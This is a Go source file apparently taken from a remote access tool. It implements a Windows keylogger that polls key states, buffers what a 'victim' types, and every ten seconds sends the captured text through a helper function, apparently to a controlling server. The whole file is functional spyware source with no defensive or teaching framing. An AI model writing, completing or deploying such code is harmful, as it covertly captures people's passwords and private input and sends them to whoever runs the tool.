package services

import (
	"fmt"
	"github.com/TheTitanrain/w32"
	"main/utils"
	"strings"
	"sync"
	"time"
)

var text = ""

type Keylogger struct {
	lastKey int
	Mutex   *sync.Mutex
	Channel chan struct{}
	saved   string
}

func (kl *Keylogger) Run(victim string) {
	go kl.Start()
	go kl.Communicate(victim)
}

type Key struct {
	keyCode int
	changed bool
}

func (kl *Keylogger) Terminate() {
	close(kl.Channel)
}

func (kl *Keylogger) GetKey() Key {
	activeKey := 0
	var keyState uint16

	for i := 0; i < 256; i++ {
		keyState = w32.GetAsyncKeyState(i)

		// Check if the most significant bit is set (key is down)
		if keyState&(1<<15) != 0 {
			activeKey = i
			break
		}
	}

	if activeKey != 0 {
		return Key{keyCode: activeKey, changed: true}

	} else {
		kl.lastKey = 0
	}

	return Key{keyCode: activeKey, changed: false}
}

func (kl *Keylogger) ParseKeycode(key int) string {
	if key >= 32 && key <= 127 {
		return string(rune(key))
	}
	return " "
}

func (kl *Keylogger) Communicate(victim string) {
	for {
		select {
		case <-kl.Channel:
			kl.Channel = make(chan struct{})
			return
		default:
			time.Sleep(10 * time.Second)
			kl.Mutex.Lock()
			if strings.Trim(text, " ") != "" {
				kl.saved += text
				text = ""
				kl.Mutex.Unlock()
			} else {
				kl.Mutex.Unlock()
				if kl.saved != "" {
					_, err := utils.HandleKeylogRequest(kl.saved, victim)
					if err != nil {
						utils.HandleError(err.Error(), victim)
						fmt.Println("Error making the request")
					} else {
						kl.saved = ""
					}
				}
			}
		}
	}
}

func (kl *Keylogger) Start() {
	for {
		select {
		case <-kl.Channel:
			return
		default:

			pressed := kl.GetKey()
			time.Sleep(time.Millisecond * 20)
			let := kl.ParseKeycode(pressed.keyCode)
			if pressed.changed {
				kl.Mutex.Lock()
				if len(text) == 0 || let[0] != text[len(text)-1] {
					text += let
				}
				kl.Mutex.Unlock()
			}
		}
	}
}
